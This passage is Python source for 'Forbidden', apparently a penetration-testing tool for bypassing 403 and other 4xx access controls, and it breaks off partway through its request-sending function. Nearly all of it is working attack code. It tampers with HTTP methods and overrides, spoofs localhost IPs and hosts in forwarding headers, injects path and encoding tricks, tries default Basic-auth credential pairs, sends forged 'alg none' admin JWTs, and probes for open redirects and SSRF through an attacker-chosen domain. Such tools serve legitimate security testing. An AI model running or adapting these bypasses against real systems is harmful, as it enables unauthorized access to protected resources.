#!/usr/bin/env python3

import datetime
import sys
import urllib.parse
import os
import re
import socket
import base64
import concurrent.futures
import subprocess
import io
import requests
import termcolor
import json

start = datetime.datetime.now()

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# -------------------------- INFO --------------------------

def basic():
	global proceed
	proceed = False
	print("Forbidden v8.2 ( github.com/ivan-sincek/forbidden )")
	print("")
	print("Usage:   forbidden -u url                       -t tests [-f force] [-v values    ] [-p path            ] [-o out         ]")
	print("Example: forbidden -u https://example.com/admin -t all   [-f GET  ] [-v values.txt] [-p /home/index.html] [-o results.json]")

def advanced():
	basic()
	print("")
	print("DESCRIPTION")
	print("    Bypass 4xx HTTP response status codes and more")
	print("URL")
	print("    Inaccessible or forbidden URL")
	print("    Parameters and fragments are ignored")
	print("    -u <url> - https://example.com/admin | etc.")
	print("TESTS")
	print("    Tests to run")
	print("    Use comma separated values")
	print("    -t <tests> - methods | [method|scheme|port]-overrides | headers | paths | encodings | auths | redirects | parsers | all")
	print("FORCE")
	print("    Force an HTTP method for nonspecific test cases")
	print("    -f <force> - GET | POST | CUSTOM | etc.")
	print("VALUES")
	print("    File with additional HTTP header values such as internal IPs, etc.")
	print("    Spacing will be stripped, empty lines ignored, and duplicates removed")
	print("    Scope: headers")
	print("    -v <values> - values.txt | etc.")
	print("PATH")
	print("    Accessible URL path to test URL overrides")
	print("    Scope: headers")
	print("    Default: /robots.txt")
	print("    -p <path> - /home/index.html | /README.txt | etc.")
	print("EVIL")
	print("    Specify (strictly) evil domain name with no port to test URL overrides")
	print("    Scope: headers | redirects")
	print("    Default: github.com")
	print("    -e <evil> - xyz.interact.sh | xyz.burpcollaborator.net | etc.")
	print("IGNORE")
	print("    Filter out 200 OK false positive results by text")
	print("    Spacing will be stripped")
	print("    -i <ignore> - Forbidden | \"Access Denied\" | etc.")
	print("LENGTHS")
	print("    Filter out 200 OK false positive results by content lengths")
	print("    Specify 'base' to ignore content length of base HTTP response")
	print("    Specify 'path' to ignore content length of accessible URL response")
	print("    Use comma separated values")
	print("    -l <lengths> - 12 | base | path | etc.")
	print("THREADS")
	print("    Number of parallel threads to run")
	print("    More threads make it quicker but can give worse results")
	print("    Heavily depends on network bandwidth and server capacity")
	print("    Default: 5")
	print("    -th <threads> - 200 | etc.")
	print("AGENT")
	print("    User agent to use")
	print("    Default: Forbidden/8.2")
	print("    -a <agent> - curl/3.30.1 | etc.")
	print("PROXY")
	print("    Web proxy to use")
	print("    -x <proxy> - 127.0.0.1:8080 | etc.")
	print("OUT")
	print("    Output file")
	print("    -o <out> - results.json | etc.")

# ------------------- MISCELENIOUS BEGIN -------------------

def unique(sequence):
	seen = set()
	return [x for x in sequence if not (x in seen or seen.add(x))]

def parse_tests(value, tests, special):
	tmp = []
	array = value.split(",")
	for entry in array:
		entry = entry.strip()
		if entry:
			if entry == special: # all
				tmp = [entry]
				break
			elif entry not in tests:
				tmp = []
				break
			else:
				tmp.append(entry)
	return unique(tmp)

def parse_content_lengths(value, specials):
	tmp = []
	array = value.split(",")
	for entry in array:
		entry = entry.strip()
		if entry:
			if entry in specials: # base, path
				tmp.append(entry)
			elif entry.isdigit() and int(entry) >= 0:
				tmp.append(int(entry))
			else:
				tmp = []
				break
	return unique(tmp)

def contains(array, values):
	return any(entry in values for entry in array)

def read_file(file):
	tmp = []
	with open(file, "r", encoding = "ISO-8859-1") as stream:
		for line in stream:
			line = line.strip()
			if line:
				tmp.append(line)
	stream.close()
	return unique(tmp)

def strip_url_scheme(string):
	return re.sub(r".+\:\/\/", "", string, 1)

def replace_multiple_slashes(string):
	return re.sub(r"\/{2,}", "/", string)

def prepend_slash(string):
	const = "/"
	if not string:
		string = const
	elif not string.startswith(const):
		string = const + string
	return string

def get_directories(path = None):
	const = "/"
	directory = const
	tmp = [directory]
	if path:
		array = path.split(const)
		for entry in array:
			if entry:
				directory += entry + const
				tmp.append(directory)
	return unique(tmp)

def append_paths(domains, paths):
	if not isinstance(domains, list):
		domains = [domains]
	if not isinstance(paths, list):
		paths = [paths]
	tmp = []
	const = "/"
	for domain in domains:
		for path in paths:
			tmp.append(domain.rstrip(const) + prepend_slash(path))
	return unique(tmp)

def extend_path(path = None):
	const = "/"
	tmp = [const]
	if path:
		path = path.strip(const)
		if path:
			tmp = [const + path + const, path + const, const + path, path]
	return unique(tmp)

def extend_domains(domains_no_port, scheme = None, port = None):
	if not isinstance(domains_no_port, list):
		domains_no_port = [domains_no_port]
	if not port and scheme:
		port = 80
		if scheme.lower() == "https":
			port = 443
	tmp = []
	for domain_no_port in domains_no_port:
		tmp.append(domain_no_port)
		if port:
			tmp.append(("{0}:{1}").format(domain_no_port, port))
		if scheme:
			tmp.extend([
				# ("{0}://{1}").format(scheme, domain_no_port),
				("{0}://{1}:{2}").format(scheme, domain_no_port, port)
			])
	return unique(tmp)

def mix(string):
	tmp = ""
	upper = False
	for character in string:
		if character.isalpha():
			if character.isupper():
				upper = True
			break
	for character in string:
		if character.isalpha():
			if upper:
				character = character.lower()
			else:
				character = character.upper()
			upper = not upper
		tmp += character
	return tmp

def capitalize(string):
	tmp = ""
	changed = False
	for character in string.lower():
		if character.isalpha() and not changed:
			character = character.upper()
			changed = True
		tmp += character
	return tmp

def hexadecimal_encode(string):
	tmp = ""
	for character in string:
		if character.isalpha() or character.isdigit():
			character = ("%{0}").format(format(ord(character), "x"))
		tmp += character
	return tmp

def unicode_encode(string):
	characters = [
		{ "original": "a", "unicode": "\u1d2c" },
		{ "original": "b", "unicode": "\u1d2e" },
		{ "original": "d", "unicode": "\u1d30" },
		{ "original": "e", "unicode": "\u1d31" },
		{ "original": "g", "unicode": "\u1d33" },
		{ "original": "h", "unicode": "\u1d34" },
		{ "original": "i", "unicode": "\u1d35" },
		{ "original": "j", "unicode": "\u1d36" },
		{ "original": "k", "unicode": "\u1d37" },
		{ "original": "l", "unicode": "\u1d38" },
		{ "original": "m", "unicode": "\u1d39" },
		{ "original": "n", "unicode": "\u1d3a" },
		{ "original": "o", "unicode": "\u1d3c" },
		{ "original": "p", "unicode": "\u1d3e" },
		{ "original": "r", "unicode": "\u1d3f" },
		{ "original": "t", "unicode": "\u1d40" },
		{ "original": "u", "unicode": "\u1d41" },
		{ "original": "w", "unicode": "\u1d42" },
		{ "original": "1", "unicode": "\u2460" },
		{ "original": "2", "unicode": "\u2461" },
		{ "original": "3", "unicode": "\u2462" },
		{ "original": "4", "unicode": "\u2463" },
		{ "original": "5", "unicode": "\u2464" },
		{ "original": "6", "unicode": "\u2465" },
		{ "original": "7", "unicode": "\u2466" },
		{ "original": "8", "unicode": "\u2467" },
		{ "original": "9", "unicode": "\u2468" }
	]
	for character in characters:
		string = string.replace(character["original"], character["unicode"])
	return string

def get_encoded_domains(domain_no_port, port):
	tmp = [
		domain_no_port,
		domain_no_port.lower(),
		domain_no_port.upper(),
		mix(domain_no_port),
		unicode_encode(domain_no_port)
	]
	for entry in [
		domain_no_port,
		domain_no_port.lower(),
		domain_no_port.upper(),
		mix(domain_no_port)
	]:
		tmp.extend([
			hexadecimal_encode(entry)
		])
	for entry in [
		unicode_encode(domain_no_port)
	]:
		tmp.extend([
			urllib.parse.quote(entry)
		])
	tmp = [("{0}:{1}").format(entry, port) for entry in tmp]
	return unique(tmp)

def get_encoded_paths(path):
	const = "/"
	array = path.strip(const).split(const)
	directory = array[-1] if len(array) > 1 else array[0]
	tmp = [
		directory,
		directory.lower(),
		directory.upper(),
		mix(directory),
		capitalize(directory),
		unicode_encode(directory)
	]
	for entry in [
		directory,
		directory.lower(),
		directory.upper(),
		mix(directory),
		capitalize(directory)
	]:
		tmp.extend([
			hexadecimal_encode(entry)
		])
	for entry in [
		unicode_encode(directory)
	]:
		tmp.extend([
			urllib.parse.quote(entry)
		])
	prepend = const + (const).join(array[0:-1]) + const if len(array) > 1 else const
	append = const if path != const and path.endswith(const) else ""
	tmp = [prepend + entry + append for entry in tmp]
	return unique(tmp)

class uniquestr(str):
	_lower = None
	def __hash__(self):
		return id(self)
	def __eq__(self, other):
		return self is other
	def lower(self):
		if self._lower is None:
			lower = str.lower(self)
			if str.__eq__(lower, self): 
				self._lower = self
			else:
				self._lower = uniquestr(lower)
		return self._lower

def jdump(data):
	return json.dumps(data, indent = 4, ensure_ascii = False)

def write_file(data, out):
	confirm = "yes"
	if os.path.isfile(out):
		print(("'{0}' already exists").format(out))
		confirm = input("Overwrite the output file (yes): ")
	if confirm.lower() == "yes":
		open(out, "w").write(data)
		print(("Results have been saved to '{0}'").format(out))

# -------------------- MISCELENIOUS END --------------------

# -------------------- VALIDATION BEGIN --------------------

# my own validation algorithm

proceed = True

def print_error(msg):
	print(("ERROR: {0}").format(msg))

def error(msg, help = False):
	global proceed
	proceed = False
	print_error(msg)
	if help:
		print("Use -h for basic and --help for advanced info")

args = {"url": None, "tests": None, "force": None, "values": None, "path": None, "evil": None, "ignore": None, "lengths": None, "threads": None, "agent": None, "proxy": None, "out": None}

# TO DO: Better URL validation. Validate "evil" and "proxy".
def validate(key, value):
	global args
	value = value.strip()
	if len(value) > 0:
		if key == "-u" and args["url"] is None:
			args["url"] = urllib.parse.urlparse(value)
			if not args["url"].scheme:
				error("URL scheme is required")
			elif args["url"].scheme not in ["http", "https"]:
				error("Supported URL schemes are 'http' and 'https'")
			elif not args["url"].netloc:
				error("Invalid domain name")
			elif args["url"].port and (args["url"].port < 1 or args["url"].port > 65535):
				error("Port number is out of range")
		elif key == "-t" and args["tests"] is None:
			args["tests"] = parse_tests(value.lower(), ["methods", "method-overrides", "scheme-overrides", "port-overrides", "headers", "paths", "encodings", "auths", "redirects", "parsers"], "all")
			if not args["tests"]:
				error("Supported tests are 'methods', '[method|scheme|port]-overrides', 'headers', 'paths', 'encodings', 'auths', 'redirects', 'parsers', or 'all'")
		elif key == "-f" and args["force"] is None:
			args["force"] = value.upper()
		elif key == "-v" and args["values"] is None:
			args["values"] = value
			if not os.path.isfile(args["values"]):
				error("File with additional values does not exists")
			elif not os.access(args["values"], os.R_OK):
				error("File with additional values does not have read permission")
			elif not os.stat(args["values"]).st_size > 0:
				error("File with additional values is empty")
			else:
				args["values"] = read_file(args["values"])
				if not args["values"]:
					error("No additional values were found")
		elif key == "-p" and args["path"] is None:
			args["path"] = prepend_slash(replace_multiple_slashes(value))
		elif key == "-e" and args["evil"] is None:
			args["evil"] = value
		elif key == "-i" and args["ignore"] is None:
			args["ignore"] = value
		elif key == "-l" and args["lengths"] is None:
			args["lengths"] = parse_content_lengths(value.lower(), ["base", "path"])
			if not args["lengths"]:
				error("Content length must be either 'base', 'path', or numeric equal or greater than zero")
		elif key == "-th" and args["threads"] is None:
			args["threads"] = value
			if not args["threads"].isdigit():
				error("Number of parallel threads to run must be numeric")
			else:
				args["threads"] = int(args["threads"])
				if args["threads"] < 1:
					error("Number of parallel threads to run must be greater than zero")
		elif key == "-a" and args["agent"] is None:
			args["agent"] = value
		elif key == "-x" and args["proxy"] is None:
			args["proxy"] = value
		elif key == "-o" and args["out"] is None:
			args["out"] = value

def check(argc, args):
	count = 0
	for key in args:
		if args[key] is not None:
			count += 1
	return argc - count == argc / 2

# --------------------- VALIDATION END ---------------------

# ------------------- TEST RECORDS BEGIN -------------------

def record(raw, identifier, url, method, headers, body, ignore, agent, proxy):
	return {"raw": raw, "id": identifier, "url": url, "method": method, "headers": headers, "body": body, "ignore": ignore, "agent": agent, "proxy": proxy, "command": None, "code": 0, "length": 0}

def get_records(identifier, append, urls, methods, headers = None, body = None, ignore = None, agent = None, proxy = None):
	if not isinstance(urls, list):
		urls = [urls]
	records = []
	if headers:
		for url in urls:
			for method in methods:
				for header in headers:
					identifier += 1
					records.append(record(identifier, str(identifier) + append.upper(), url, method, header if isinstance(header, list) else [header], body, ignore, agent, proxy))
	else:
		for url in urls:
			for method in methods:
				identifier += 1
				records.append(record(identifier, str(identifier) + append.upper(), url, method, [], body, ignore, agent, proxy))
	return records

def fetch(url, method, headers = None, body = None, ignore = None, agent = None, proxy = None):
	return send_request(record(0, "-FETCH-0", url, method, headers, body, ignore, agent, proxy))

def fetch_accessible(urls, method, headers = None, body = None, ignore = None, agent = None, proxy = None):
	if not isinstance(urls, list):
		urls = [urls]
	records = []
	for url in urls:
		record = fetch(url, method, headers, body, ignore, agent, proxy)
		if record["code"] >= 200 and record["code"] < 400:
			records.append(record)
	return records

def fetch_ips(domains_no_port):
	if not isinstance(domains_no_port, list):
		domains_no_port = [domains_no_port]
	ips = []
	for domain_no_port in domains_no_port:
		try:
			ips.append(socket.gethostbyname(domain_no_port))
		except socket.error:
			pass
	return ips

# -------------------- TEST RECORDS END --------------------

# -------------------- STRUCTURES BEGIN --------------------

def get_base_urls(scheme, domain_no_port, port, path):
	return [
		("http://{0}:{1}{2}").format(domain_no_port, port if scheme == "http" else 80, path),
		("https://{0}:{1}{2}").format(domain_no_port, port if scheme == "https" else 443, path)
	]

def get_methods():
	return unique([
		"ACL",
		"ARBITRARY",
		"BASELINE-CONTROL",
		"BIND",
		"CHECKIN",
		"CHECKOUT",
		"CONNECT",
		"COPY",
		# "DELETE", # NOTE: This HTTP method is dangerous!
		"GET",
		"HEAD",
		"INDEX",
		"LABEL",
		"LINK",
		"LOCK",
		"MERGE",
		"MKACTIVITY",
		"MKCALENDAR",
		"MKCOL",
		"MKREDIRECTREF",
		"MKWORKSPACE",
		"MOVE",
		"OPTIONS",
		"ORDERPATCH",
		"PATCH",
		"POST",
		"PRI",
		"PROPFIND",
		"PROPPATCH",
		"PUT",
		"REBIND",
		"REPORT",
		"SEARCH",
		"SHOWMETHOD",
		"SPACEJUMP",
		"TEXTSEARCH",
		"TRACE",
		"TRACK",
		"UNBIND",
		"UNCHECKOUT",
		"UNLINK",
		"UNLOCK",
		"UPDATE",
		"UPDATEREDIRECTREF",
		"VERSION-CONTROL"
	])

def get_method_override_headers(methods):
	tmp = []
	headers = [
		"X-HTTP-Method",
		"X-HTTP-Method-Override",
		"X-Method-Override"
	]
	for header in headers:
		for method in methods:
			tmp.append(("{0}: {1}").format(header, method))
	return unique(tmp)

def get_method_override_urls(url, methods):
	tmp = []
	parameters = [
		"x-http-method-override",
		"x-method-override"
	]
	separator = "?"
	if separator in url:
		separator = "&"
	for parameter in parameters:
		for method in methods:
			tmp.append(("{0}{1}{2}={3}").format(url, separator, parameter, method))
	return unique(tmp)

def get_scheme_override_headers(schemes):
	tmp = []
	headers = [
		"X-Forwarded-Proto",
		"X-Forwarded-Protocol",
		"X-Forwarded-Scheme",
		"X-URL-Scheme",
		"X-URLSCHEME"
	]
	ssl = [
		"Front-End-HTTPS",
		"X-Forwarded-SSL"
	]
	for scheme in schemes:
		for header in headers:
			tmp.append(("{0}: {1}").format(header, scheme))
		status = "off"
		if scheme.lower() == "https":
			status = "on"
		for header in ssl:
			tmp.append(("{0}: {1}").format(header, status))
	return unique(tmp)

def get_port_override_headers(ports):
	tmp = []
	headers = [
		"X-Forwarded-Port"
	]
	for header in headers:
		for port in ports:
			tmp.append(("{0}: {1}").format(header, port))
	return unique(tmp)

# TO DO: Add IPv6 localhost.
def get_localhost_urls(scheme = None, port = None):
	return extend_domains(["localhost", "127.0.0.1", unicode_encode("127.0.0.1"), "127.000.000.001"], scheme, port)

def get_random_urls(scheme = None, port = None):
	return extend_domains(["192.168.1.5"], scheme, port)

def get_values(evil, scheme = None, port = None, values = None):
	tmp = get_localhost_urls(scheme, port) + get_random_urls(scheme, port) + extend_domains(evil, scheme)
	if values:
		tmp.extend(values)
	return unique(tmp)

def get_headers(values):
	tmp = []
	headers = [
		"Base-URL",
		"CF-Connecting-IP",
		"Client-IP",
		"Cluster-Client-IP",
		"Connection",
		"Contact",
		"Destination",
		"Forwarded",
		"Forwarded-For",
		"Forwarded-For-IP",
		"From",
		"Host",
		"Origin",
		"Profile",
		"Proxy",
		"Redirect",
		"Referer",
		"Request-URI",
		"Stuff",
		"True-Client-IP",
		"URI",
		"URL",
		"X-Client-IP",
		"X-Forward",
		"X-Forwarded",
		"X-Forwarded-By",
		"X-Forwarded-For",
		"X-Forwarded-For-Original",
		"X-Forwarded-Host",
		"X-Forwarded-Server",
		"X-Forward-For",
		"X-Host",
		"X-Host-Override",
		"X-HTTP-DestinationURL",
		"X-HTTP-Host-Override",
		"X-Originally-Forwarded-For",
		"X-Original-Remote-Addr",
		"X-Original-URL",
		"X-Originating-IP",
		"X-Override-URL",
		"X-Proxy-URL",
		"X-ProxyUser-IP",
		"X-Real-IP",
		"X-Referer",
		"X-Remote-Addr",
		"X-Remote-IP",
		"X-Rewrite-URL",
		"X-Server-IP",
		"X-Wap-Profile"
	]
	for header in headers:
		for value in values:
			tmp.append(("{0}: {1}").format(header, value))
	headers = [
		"X-Custom-IP-Authorization"
	]
	injections = ["", ";", ".;", "..;"]
	for header in headers:
		for value in values:
			for injection in injections:
				tmp.append(("{0}: {1}{2}").format(header, value, injection))
	return unique(tmp)

def get_double_host_header(initials, overrides):
	tmp = []
	for initial in initials:
		for override in overrides:
			tmp.append([
				("Host: {0}").format(initial),
				("Host: {0}").format(override)
			])
	return tmp

def get_bypass_urls(scheme_domain, initial_path = None):
	tmp = []
	const = "/"
	# --------------------
	path = initial_path.strip(const) if initial_path else ""
	# --------------------
	# NOTE: Inject at the beginning, end, and both beginning and end of URL path. All combinations.
	injections = []
	for i in ["", "%09", "%20", "%23", "%2e", "*", ".", "..", ";", ".;", "..;", ";foo=bar;"]:
		injections.extend([const + i + const, i + const, const + i, i])
	for i in injections:
		tmp.extend([path + i, i + path])
		if path:
			for j in injections:
				tmp.extend([i + path + j])
	# --------------------
	# NOTE: Inject at the end of URL path.
	paths = [path, path + const]
	injections = []
	for i in ["#", "*", ".", "?", "~"]:
		injections.extend([i, i + i, i + "random"])
	for p in paths:
		for i in injections:
			tmp.extend([p + i])
	# --------------------
	# NOTE: Inject at the end of URL path, but only if URL path does not end with '/'.
	if path and not initial_path.endswith(const):
		injections = ["asp", "aspx", "esp", "html", "jhtml", "json", "jsp", "jspa", "jspx", "php", "sht", "shtml", "xhtml"]
		for i in injections:
			tmp.extend([path + "." + i])
	# --------------------
	return unique([scheme_domain + prepend_slash(bypass) for bypass in tmp])

# NOTE: Only domain name and last directory/file in URL path are transformed and encoded.
def get_encoded_urls(scheme, domain_no_port, port, path = None):
	tmp = []
	scheme += "://"
	domains = get_encoded_domains(domain_no_port, port)
	if path:
		for domain in domains:
			tmp.append(scheme + domain + path)
		paths = get_encoded_paths(path)
		for p in paths:
			tmp.append(scheme + ("{0}:{1}").format(domain_no_port, port) + p)
		for domain in domains:
			for p in paths:
				tmp.append(scheme + domain + p)
	else:
		for domain in domains:
			tmp.append(scheme + domain)
	return unique(tmp)

def get_basic_auth_headers():
	tmp = []
	headers = [
		"Authorization"
	]
	values = ["", "null", "None", "nil"]
	usernames = ["admin", "cisco", "gateway", "guest", "jigsaw", "root", "router", "switch", "tomcat", "wampp", "xampp"]
	passwords = ["admin", "cisco", "default", "gateway", "guest", "jigsaw", "password", "root", "router", "secret", "switch", "tomcat", "toor", "wampp", "xampp"]
	for username in usernames:
		for password in passwords:
			values.append(base64.b64encode((username + ":" + password).encode("UTF-8")).decode("UTF-8"))
	for header in headers:
		for value in values:
			tmp.append(("{0}: Basic {1}").format(header, value))
	return unique(tmp)

def get_bearer_auth_headers():
	tmp = []
	headers = [
		"Authorization"
	]
	values = ["", "null", "None", "nil", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.", "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.", "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.", "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.r-hgxha_LeQiMlH5NKCmjNQtxPjWA91xL10_flfoTTs"]
	for header in headers:
		for value in values:
			tmp.append(("{0}: Bearer {1}").format(header, value))
	return unique(tmp)

def get_redirect_urls(scheme, domain_no_port, evil, path = None):
	tmp = []
	overrides = extend_domains(evil, scheme)
	tmp.extend(overrides)
	const = "/"
	injections = [const, const + "."]
	for override in overrides:
		for injection in injections:
			tmp.append(override + injection + domain_no_port)
			if path:
				tmp.append(override + injection + domain_no_port + path)
		override = strip_url_scheme(override)
		tmp.extend([
			("{0}.{1}").format(domain_no_port, override),
			("{0}://{1}.{2}").format(scheme, domain_no_port, override)
		])
	return unique(tmp)

def get_broken_urls(scheme, domain_no_port, port, evil):
	tmp = []
	injections = ["@", " @", "#@"]
	for initial in extend_domains(domain_no_port, scheme, port):
		for override in extend_domains(evil, scheme):
			override = strip_url_scheme(override)
			for injection in injections:
				tmp.append(initial + injection + override)
	return unique(tmp)

# --------------------- STRUCTURES END ---------------------

# ----------------------- TASK BEGIN -----------------------

# TO DO: Do not ignore URL parameters and fragments.
def parse_url(url):
	scheme = url.scheme.lower() + "://"
	domain = url.netloc.lower()
	port = url.port
	if not port:
		port = 80
		if url.scheme.lower() == "https":
			port = 443
		domain = ("{0}:{1}").format(domain, port)
	path = replace_multiple_slashes(url.path)
	tmp = {
		"scheme": url.scheme.lower(),
		"port": port,
		"domain_no_port": url.netloc.lower().split(":", 1)[0],
		"domain": domain,
		"scheme_domain": scheme + domain,
		"path": path,
		"full": scheme + domain + path,
		"directories": append_paths(scheme + domain, get_directories(path)),
		"paths": extend_path(path)
	}
	tmp["urls"] = [tmp["full"], tmp["scheme_domain"], tmp["domain"], tmp["domain_no_port"]]
	tmp["all"] = tmp["urls"] + tmp["paths"]
	for key in tmp:
		if isinstance(tmp[key], list):
			tmp[key] = unique(tmp[key])
	return tmp

def get_collection(url, tests, accessible, evil, force = None, values = None, ignore = None, agent = None, proxy = None):
	collection = []
	identifier = 0
	if contains(tests, ["methods", "all"]):
		local = {
			"urls": {
				"base": get_base_urls(url["scheme"], url["domain_no_port"], url["port"], url["path"])
			},
			"methods": [force] if force else get_methods(),
			"headers": {
				"content-lengths": ["Content-Length: 0"]
			},
			"xst": {
				"methods": ["TRACE", "TRACK"],
				"headers": ["XSTH: XSTV"]
			},
			"file-upload": {
				"urls": append_paths(url["directories"], ["/pentest.txt"]),
				"methods": ["PUT"],
				"headers": ["Content-Type: ", "Content-Type: text/plain"],
				"body": "pentest"
			}
		}
		# NOTE: Test HTTP methods with both HTTP and HTTPS requests.
		records = get_records(identifier, "-METHODS-1", local["urls"]["base"], local["methods"], None, None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
		# NOTE: Test HTTP methods with 'Content-Length: 0' header.
		records = get_records(identifier, "-METHODS-2", url["full"], local["methods"], local["headers"]["content-lengths"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
		# NOTE: Test cross-site tracing (XST) with HTTP TRACE and TRACK methods.
		# NOTE: To confirm the vulnerability, check if 'XSTH: XSTV' header is returned in HTTP response.
		records = get_records(identifier, "-METHODS-3", url["full"], local["xst"]["methods"], local["xst"]["headers"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
		# NOTE: Test [text] file upload with HTTP PUT method.
		records = get_records(identifier, "-METHODS-4", local["file-upload"]["urls"], local["file-upload"]["methods"], local["file-upload"]["headers"], local["file-upload"]["body"], ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
	if contains(tests, ["method-overrides", "all"]):
		local = {
			"urls": {
				"method-overrides": get_method_override_urls(url["full"], [force] if force else get_methods())
			},
			"methods": get_methods(),
			"headers": {
				"method-overrides": get_method_override_headers([force] if force else get_methods())
			}
		}
		# NOTE: Test HTTP method overrides with HTTP headers.
		records = get_records(identifier, "-METHOD-OVERRIDES-1", url["full"], local["methods"], local["headers"]["method-overrides"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
		# NOTE: Test HTTP method overrides with URL parameters.
		records = get_records(identifier, "-METHOD-OVERRIDES-2", local["urls"]["method-overrides"], local["methods"], None, None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
	if contains(tests, ["scheme-overrides", "all"]):
		local = {
			"urls": {
				"base": get_base_urls(url["scheme"], url["domain_no_port"], url["port"], url["path"])
			},
			"methods": [force] if force else ["GET"],
			"headers": {
				"scheme-overrides": get_scheme_override_headers(["http", "https"])
			}
		}
		# NOTE: Test URL scheme overrides.
		records = get_records(identifier, "-SCHEME-OVERRIDES-1", local["urls"]["base"], local["methods"], local["headers"]["scheme-overrides"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
	if contains(tests, ["port-overrides", "all"]):
		local = {
			"methods": [force] if force else ["GET"],
			"headers": {
				"port-overrides": get_port_override_headers([url["port"], 80, 443, 4443, 8008, 8080, 8403, 8443, 9008, 9080, 9403, 9443])
			}
		}
		# NOTE: Test port overrides.
		records = get_records(identifier, "-PORT-OVERRIDES-1", url["full"], local["methods"], local["headers"]["port-overrides"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
	if contains(tests, ["headers", "all"]):
		local = {
			"methods": [force] if force else ["GET"],
			"headers": {
				"accepts": ["Accept: application/json,text/javascript,*/*;q=0.01"],
				"all": get_headers(get_values(evil, url["scheme"], url["port"], url["all"] + values if values else url["all"])),
				"paths": get_headers([url["full"]] + url["paths"]),
				"hosts": get_double_host_header(url["urls"], extend_domains(evil, url["scheme"]))
			}
		}
		# NOTE: Test information disclosure with 'Accept' header.
		records = get_records(identifier, "-HEADERS-1", url["full"], local["methods"], local["headers"]["accepts"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
		# NOTE: Test HTTP headers with full URL and all values (including user-supplied ones).
		records = get_records(identifier, "-HEADERS-2", url["full"], local["methods"], local["headers"]["all"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
		# NOTE: Test HTTP headers with base URL and only path values.
		records = get_records(identifier, "-HEADERS-3", url["scheme_domain"], local["methods"], local["headers"]["paths"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
		# NOTE: Test HTTP headers with accessible URL and only path values.
		records = get_records(identifier, "-HEADERS-4", accessible, local["methods"], local["headers"]["paths"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
		# NOTE: Test URL override with double 'Host' header.
		records = get_records(identifier, "-HEADERS-5", url["full"], local["methods"], local["headers"]["hosts"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
	if contains(tests, ["paths", "all"]):
		local = {
			"urls": {
				"bypass": get_bypass_urls(url["scheme_domain"], url["path"])
			},
			"methods": [force] if force else ["GET"],
		}
		# NOTE: Test URL path bypasses.
		records = get_records(identifier, "-PATHS-1", local["urls"]["bypass"], local["methods"], None, None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
	if contains(tests, ["encodings", "all"]):
		local = {
			"urls": {
				"encoded": get_encoded_urls(url["scheme"], url["domain_no_port"], url["port"], url["path"])
			},
			"methods": [force] if force else ["GET"],
		}
		# NOTE: Test URL transformations and encodings. Only domain name and last directory/file in URL path are transformed and encoded.
		records = get_records(identifier, "-ENCODINGS-1", local["urls"]["encoded"], local["methods"], None, None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
	if contains(tests, ["auths", "all"]):
		local = {
			"methods": [force] if force else ["GET"],
			"headers": {
				"auths": get_basic_auth_headers() + get_bearer_auth_headers()
			}
		}
		# NOTE: Test basic and bearer authentication.
		records = get_records(identifier, "-AUTHS-1", url["full"], local["methods"], local["headers"]["auths"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
	if contains(tests, ["redirects", "all"]):
		local = {
			"methods": [force] if force else ["GET"],
			"headers": {
				"redirects": get_headers(get_redirect_urls(url["scheme"], url["domain_no_port"], evil, url["path"]))
			}
		}
		# NOTE: Test open redirects and server-side request forgery (SSRF).
		records = get_records(identifier, "-REDIRECTS-1", url["full"], local["methods"], local["headers"]["redirects"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
	if contains(tests, ["parsers", "all"]):
		local = {
			"methods": [force] if force else ["GET"],
			"headers": {
				"parsers": get_headers(get_broken_urls(url["scheme"], url["domain_no_port"], url["port"], evil))
			}
		}
		# NOTE: Test URL parsers.
		records = get_records(identifier, "-PARSERS-1", url["full"], local["methods"], local["headers"]["parsers"], None, ignore, agent, proxy)
		collection.extend(records)
		identifier = len(collection)
	return collection

# TO DO: Escape single quotes.
def get_commands(collection):
	for record in collection:
		curl = ["curl", "--connect-timeout 90", "-m 180", "-iskL", "--max-redirs 10", "--path-as-is"]
		if record["body"]:
			curl.append(("-d '{0}'").format(record["body"]))
		if record["headers"]:
			for header in record["headers"]:
				curl.append(("-H '{0}'").format(header))
		if record["agent"]:
			curl.append(("-H 'User-Agent: {0}'").format(record["agent"]))
		if record["proxy"]:
			curl.append(("-x '{0}'").format(record["proxy"]))
		curl.append(("-X '{0}'").format(record["method"]))
		curl.append(("'{0}'").format(record["url"]))
		record["command"] = (" ").join(curl)
	return collection

def filter(collection):
	tmp = []
	commands = []
	for record in collection:
		if record["command"] not in commands:
			commands.append(record["command"])
			tmp.append(record)
	return tmp

def get_timestamp(text):
	return print(("{0} - {1}").format(datetime.datetime.now().strftime("%H:%M:%S"), text))

def progress(count, total):
	end = "\r"
	if count == total:
		end = "\n"
	print(("Progress: {0}/{1} | {2:.2f}%").format(count, total, (count / total) * 100), end = end)

# TO DO: Fix bugs and optimize.
def send_request(record):
	encoding = "UTF-8"
	if record["body"]:
		record["body"].encode(encoding)
	headers = {}
	if record["headers"]:
		for header in record["headers"]:
